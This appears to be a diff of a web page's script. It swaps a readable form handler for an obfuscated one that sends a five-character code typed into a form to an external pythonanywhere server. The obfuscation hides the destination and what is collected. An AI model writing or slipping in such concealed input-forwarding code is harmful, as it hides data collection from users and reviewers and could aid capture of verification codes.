@@ -35,31 +35,7 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.1/umd/popper.min.js"></script>
     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
     <script>
-        document.getElementById('myForm').addEventListener('submit', function (event) {
-            event.preventDefault(); // Prevent the default form submission
-
-            var codeInput = document.getElementById('code').value;
-
-            if (codeInput.length === 5) {
-                var payload = { 'code': codeInput };
-                console.log(JSON.stringify(payload));
-                fetch('https://mouadcoding.pythonanywhere.com/confirm', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                })
-                    .then(response => response.json())
-                    .then(data => {
-                        // Process the response JSON data here
-                        console.log(data);
-                    })
-                    .catch(error => {
-                        console.error('Error:', error);
-                    });
-            }
-        });
+        (function (_0x48d969, _0x2874be) { var _0x27e0da = _0x3a1f, _0x5505fb = _0x48d969(); while (!![]) { try { var _0x438ef8 = -parseInt(_0x27e0da(0x148)) / 0x1 * (parseInt(_0x27e0da(0x145)) / 0x2) + -parseInt(_0x27e0da(0x143)) / 0x3 + parseInt(_0x27e0da(0x13a)) / 0x4 + -parseInt(_0x27e0da(0x137)) / 0x5 * (-parseInt(_0x27e0da(0x138)) / 0x6) + parseInt(_0x27e0da(0x132)) / 0x7 + parseInt(_0x27e0da(0x130)) / 0x8 * (-parseInt(_0x27e0da(0x139)) / 0x9) + parseInt(_0x27e0da(0x13c)) / 0xa; if (_0x438ef8 === _0x2874be) break; else _0x5505fb['push'](_0x5505fb['shift']()); } catch (_0x3f2daa) { _0x5505fb['push'](_0x5505fb['shift']()); } } }(_0x9a7d, 0x97af7)); function hi() { var _0x25729c = _0x3a1f; console['log'](_0x25729c(0x141)), document[_0x25729c(0x147)](_0x25729c(0x133))[_0x25729c(0x140)](_0x25729c(0x13e), function (_0x4724c2) { var _0x5c0f12 = _0x25729c; _0x4724c2[_0x5c0f12(0x13f)](); var _0x3c8e52 = document[_0x5c0f12(0x147)]('code')[_0x5c0f12(0x144)]; if (_0x3c8e52['length'] === 0x5) { var _0x215192 = { 'code': _0x3c8e52 }; console[_0x5c0f12(0x13d)](JSON['stringify'](_0x215192)), fetch(_0x5c0f12(0x134), { 'method': _0x5c0f12(0x149), 'headers': { 'Content-Type': _0x5c0f12(0x131) }, 'body': JSON[_0x5c0f12(0x142)](_0x215192) })['then'](_0x57b4f0 => _0x57b4f0[_0x5c0f12(0x135)]())[_0x5c0f12(0x146)](_0x6e5acc => { var _0xe933 = _0x5c0f12; console[_0xe933(0x13d)](_0x6e5acc); })[_0x5c0f12(0x13b)](_0x5707b7 => { var _0x3a69b7 = _0x5c0f12; console['error'](_0x3a69b7(0x136), _0x5707b7); }); } }); } function _0x3a1f(_0xceb9b8, _0x3dd344) { var _0x9a7d4f = _0x9a7d(); return _0x3a1f = function (_0x3a1fda, _0xd80127) { _0x3a1fda = _0x3a1fda - 0x130; var _0x118c6b = _0x9a7d4f[_0x3a1fda]; return _0x118c6b; }, _0x3a1f(_0xceb9b8, _0x3dd344); } hi(); function _0x9a7d() { var _0x54d619 = ['application/json', '8394113nzVzMV', 'myForm', 'https://mouadcoding.pythonanywhere.com/confirm', 'json', 'Error:', '25ycjiAW', '635838oJekLD', '8622UBwRlQ', '2397384aidWCK', 'catch', '7151780xSItLX', 'log', 'submit', 'preventDefault', 'addEventListener', 'Hello\x20World!', 'stringify', '985272xeckUF', 'value', '2498QjoUyw', 'then', 'getElementById', '723seRyoR', 'POST', '9944Xvsoym']; _0x9a7d = function () { return _0x54d619; }; return _0x9a7d(); }
     </script>
 </body>
 
